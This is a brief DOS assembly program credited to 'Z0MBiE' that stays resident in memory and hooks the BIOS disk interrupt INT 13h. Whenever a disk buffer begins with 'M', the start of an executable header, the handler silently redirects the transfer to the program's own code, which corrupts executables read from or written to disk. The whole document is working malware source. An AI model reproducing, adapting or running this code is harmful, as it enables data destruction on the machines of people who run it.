
; (c) Z0MBiE

                .model  tiny
                .code
                .386
                org 100h
start:
                mov     ah, 13h
                int     2Fh

                push    cs
                pop     ds
                lea     dx, int13

                push    es
                push    bx
                pop     dword ptr old13

                int     2Fh

                xchg    dx, ax
                int     27h

int13:         ; cmp ah, 03h
               ; jne exit13

                cmp     byte ptr es:[bx], 'M'
                jne     exit13

                push    cs
                pop     es
                lea     bx, start

exit13:         db      0EAh
old13           dd      ?

                end     start
